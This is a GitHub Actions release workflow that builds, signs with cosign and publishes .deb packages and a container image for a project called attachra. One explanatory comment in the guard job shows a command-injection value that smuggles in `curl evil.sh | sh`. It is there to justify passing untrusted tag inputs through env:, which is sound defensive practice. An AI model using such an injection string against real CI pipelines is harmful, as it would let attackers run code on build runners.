name: Release

# Publishes the two artifacts a self-hosted install actually needs: the
# .deb packages (linux/amd64+arm64) attached to the GitHub Release, and a
# multi-arch container image pushed to GHCR. Both are signed keylessly
# with cosign (Sigstore/Fulcio via GitHub OIDC, no private key material
# anywhere) — see "Verifying releases" in README.md for the verification
# commands. Mirrors the internal build pipeline that already does this on
# a tag, just aimed at the public registries instead.
on:
  push:
    tags:
      - "v*.*.*"
  # Lets a maintainer (re-)run this workflow for a tag that already
  # exists — e.g. a release that shipped before this workflow did, or a
  # run that needs to be repeated after a registry outage. Unlike the
  # push trigger, this always runs from the default branch (the tag
  # itself is not checked out automatically for a manual run), so the
  # tag to build and release is passed explicitly via the `tag` input
  # instead of being read off github.ref_name.
  workflow_dispatch:
    inputs:
      tag:
        description: "Existing vX.Y.Z tag to build and attach artifacts for"
        type: string
        required: true
      publish_latest:
        description: "Also move the :latest image tag and the Latest release badge to this tag"
        type: boolean
        default: false

jobs:
  # Resolves and validates which tag this run releases, then hands that
  # tag to every other job as an output (needs.guard.outputs.release_tag)
  # rather than letting each job read github.ref_name itself — on a
  # workflow_dispatch run github.ref_name is the default branch, not a
  # release tag, so every downstream use of "the tag" has to go through
  # this output instead.
  #
  # This job also decides whether this run is allowed to move the
  # floating ":latest" image tag / the Release "Latest" badge: a normal
  # tag push always does (it's assumed to be the newest release), but a
  # workflow_dispatch re-run against an older tag must not, unless the
  # operator opts in via the publish_latest input — otherwise a
  # retroactive run would drag :latest and the badge backwards onto an
  # old version.
  guard:
    name: Validate release ref
    runs-on: ubuntu-latest
    permissions: {}
    outputs:
      release_tag: ${{ steps.resolve.outputs.release_tag }}
      promote_latest: ${{ steps.decide.outputs.promote_latest }}
    steps:
      - name: Resolve and validate the release tag
        id: resolve
        # inputs.tag and github.ref_name are attacker-influenceable
        # strings (a workflow_dispatch caller controls the former; a tag
        # pusher controls the latter) — the ${{ }} expression syntax does
        # plain text substitution into the script *before* the shell
        # ever runs, so interpolating either one directly into `run:`
        # would let a value like `v1.0.0"; curl evil.sh | sh #` execute
        # as shell code ahead of the regex check below. Pass them through
        # `env:` instead so they only ever reach the shell as ordinary
        # variable values.
        env:
          TAG_INPUT: ${{ inputs.tag }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          if [[ "${{ github.event_name }}" == "workflow_dispatch" ]]; then
            tag="$TAG_INPUT"
          else
            tag="$REF_NAME"
          fi

          if [[ ! "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "::error::Release workflow requires a semver tag (vX.Y.Z), got '$tag' (event: ${{ github.event_name }})."
            echo "For a manual run, set the 'tag' input to an existing vX.Y.Z tag."
            exit 1
          fi

          # A tag push guarantees the ref exists (it IS the tag being
          # pushed). workflow_dispatch's `tag` is just a free-form string
          # input though, and this run executes from the default branch —
          # confirm the tag actually exists before any other job tries to
          # build or release it, so a typo fails loudly here instead of
          # softprops/action-gh-release silently attaching assets to a
          # release created against the wrong ref.
          if [[ "${{ github.event_name }}" == "workflow_dispatch" ]]; then
            if ! git ls-remote --exit-code --tags \
                "${{ github.server_url }}/${{ github.repository }}.git" \
                "refs/tags/$tag" >/dev/null; then
              echo "::error::Tag '$tag' does not exist in ${{ github.repository }}."
              exit 1
            fi
          fi

          echo "release_tag=$tag" >> "$GITHUB_OUTPUT"
          echo "Releasing $tag"

      - name: Decide whether to promote :latest
        id: decide
        # Same reasoning as the step above: publish_latest is declared as
        # a boolean input, but a workflow triggered via the REST API
        # (rather than the Actions UI) is not restricted to "true"/
        # "false" for it — treat it as an untrusted string and pass it
        # through env: rather than interpolating it into the script.
        env:
          PUBLISH_LATEST_INPUT: ${{ inputs.publish_latest }}
        run: |
          if [[ "${{ github.event_name }}" == "push" || "$PUBLISH_LATEST_INPUT" == "true" ]]; then
            echo "promote_latest=true" >> "$GITHUB_OUTPUT"
          else
            echo "promote_latest=false" >> "$GITHUB_OUTPUT"
          fi

  deb:
    name: Build and publish .deb packages
    needs: guard
    runs-on: ubuntu-latest
    permissions:
      contents: write
      # Exchanged for a short-lived GitHub OIDC token that Fulcio uses to
      # mint a one-time signing certificate for cosign's keyless mode —
      # no signing key is stored or managed anywhere.
      id-token: write
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
        with:
          ref: ${{ needs.guard.outputs.release_tag }}
          fetch-depth: 0

      - name: Setup Go
        uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5.6.0
        with:
          go-version-file: go.mod
          cache: true

      - name: Build .deb packages (amd64 + arm64)
        run: make build-deb VERSION=${{ needs.guard.outputs.release_tag }}

      - name: Generate checksums
        run: |
          cd dist
          sha256sum *.deb > SHA256SUMS

      - name: Install Cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      # Signs the checksum file rather than each .deb individually:
      # SHA256SUMS already binds to every package by hash, so one
      # signature over it transitively covers all of them. Keyless
      # (Sigstore/Fulcio, no key material — see the job's id-token
      # permission comment above). The bundle format is cosign's current
      # recommendation over separate .sig/.pem files, and is one of the
      # asset patterns OpenSSF Scorecard's Signed-Releases check
      # recognizes.
      - name: Sign checksums (keyless)
        run: |
          cosign sign-blob --yes \
            --bundle dist/SHA256SUMS.sigstore.json \
            dist/SHA256SUMS

      # Release notes are expected to already exist on this tag's GitHub
      # Release (written by a human before the tag is pushed, per the
      # release checklist). If the tag arrives before the release notes
      # do, action-gh-release creates the release with an empty body —
      # that's intentional fallback behavior, not a bug in this workflow.
      - name: Attach assets to the GitHub Release
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3.0.2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ needs.guard.outputs.release_tag }}
          fail_on_unmatched_files: true
          make_latest: ${{ needs.guard.outputs.promote_latest }}
          files: |
            dist/*.deb
            dist/SHA256SUMS
            dist/SHA256SUMS.sigstore.json

  image:
    name: Build and publish container image
    needs: guard
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      # Exchanged for a short-lived GitHub OIDC token that Fulcio uses to
      # mint a one-time signing certificate for cosign's keyless mode —
      # no signing key is stored or managed anywhere.
      id-token: write
    steps:
      - name: Checkout
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
        with:
          ref: ${{ needs.guard.outputs.release_tag }}

      # github.sha is the commit that triggered the run, which on
      # workflow_dispatch is the default branch tip, not the tag's
      # commit (the checkout step above already moved HEAD to the tag
      # via `ref:`) — read the actual checked-out commit instead so the
      # image's embedded commit metadata is correct on both trigger types.
      - name: Compute image build metadata
        id: meta
        run: |
          echo "date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"
          echo "commit=$(git rev-parse HEAD)" >> "$GITHUB_OUTPUT"

      # Only include the floating ":latest" tag when this run is allowed
      # to promote it (see the guard job) — otherwise a retroactive
      # workflow_dispatch on an old tag would move :latest backwards.
      - name: Compute image tags
        id: tags
        run: |
          tags="ghcr.io/302-digital/attachra:${{ needs.guard.outputs.release_tag }}"
          if [[ "${{ needs.guard.outputs.promote_latest }}" == "true" ]]; then
            tags="${tags}"$'\n'"ghcr.io/302-digital/attachra:latest"
          fi
          {
            echo "tags<<EOF"
            echo "$tags"
            echo "EOF"
          } >> "$GITHUB_OUTPUT"

      - name: Set up QEMU
        uses: docker/setup-qemu-action@c7c53464625b32c7a7e944ae62b3e17d2b600130 # v3.7.0

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@8d2750c68a42422c14e847fe6c8ac0403b4cbd6f # v3.12.0

      - name: Log in to GHCR
        uses: docker/login-action@af1e73f918a031802d376d3c8bbc3fe56130a9b0 # v4.4.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push image
        id: build
        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          build-args: |
            VERSION=${{ needs.guard.outputs.release_tag }}
            COMMIT=${{ steps.meta.outputs.commit }}
            DATE=${{ steps.meta.outputs.date }}
          tags: ${{ steps.tags.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Install Cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2

      # Signs the image by its content digest, not by tag: the digest is
      # immutable and every tag above (including a promoted :latest)
      # resolves to this same one, so a single signature covers all of
      # them. Keyless (Sigstore/Fulcio via GitHub OIDC — see the job's
      # id-token permission comment above); reuses the registry session
      # the login step already established.
      - name: Sign the container image (keyless)
        env:
          IMAGE_DIGEST: ${{ steps.build.outputs.digest }}
        run: cosign sign --yes "ghcr.io/302-digital/attachra@${IMAGE_DIGEST}"
